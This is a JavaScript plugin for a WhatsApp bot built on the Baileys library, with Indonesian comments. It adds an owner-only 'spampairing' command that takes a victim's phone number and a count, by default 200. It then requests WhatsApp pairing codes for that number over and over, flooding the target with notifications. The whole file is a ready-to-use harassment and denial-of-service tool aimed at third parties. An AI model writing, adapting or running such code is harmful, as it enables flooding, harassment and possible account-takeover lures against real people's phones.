// 📝 plugin bug - spampairing

const fetch = require('node-fetch');
const { useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');

let handler = async (m, { text, usedPrefix, command }) => {
  if (command === 'spampairing') {
    if (!text) throw `*Contoh:* ${usedPrefix}spampairing +628xxxxxx|150`;
    
    try {
      m.reply('⏳ Proses spam pairing sedang berjalan...');
      const [phoneNumber, count = '200'] = text.split('|');
      const jid = phoneNumber.replace(/[^\d]/g, '');
      
      const { state } = await useMultiFileAuthState('tmp');
      const { version } = await fetchLatestBaileysVersion();
      const socket = await require('@whiskeysockets/baileys').default({
        auth: state,
        version,
        logger: pino({ level: 'fatal' })
      });

      for (let i = 0; i < parseInt(count); i++) {
        await new Promise(resolve => setTimeout(resolve, 1500));
        const code = await socket.requestPairingCode(jid);
        console.log(`_Success Spam Pairing Code - Number: ${phoneNumber} - Code: ${code}_`);
      }

      await new Promise(resolve => setTimeout(resolve, 3000)); //ubah sendiri delay antar pairing berpa, default ini 3 detik
      let capt = `乂 *SPAM PAIRING*\n\n`;
      capt += `◦  Nomor: ${phoneNumber}\n`;
      capt += `◦  Jumlah: ${count} kali\n`;
      capt += `◦  Status: ✅ Selesai\n`;
      capt += `◦  Selesai Pada: ${new Date().toLocaleString()}\n`;
      return m.reply(capt);
    } catch (error) {
      console.error(error);
      return m.reply('*Terjadi kesalahan saat menjalankan spam pairing!*');
    }
  }
};

handler.command = ['spampairing'];
handler.help = ['spampairing <nomor>|<jumlah>'];
handler.tags = ['bug'];
handler.rowner = true

module.exports = handler;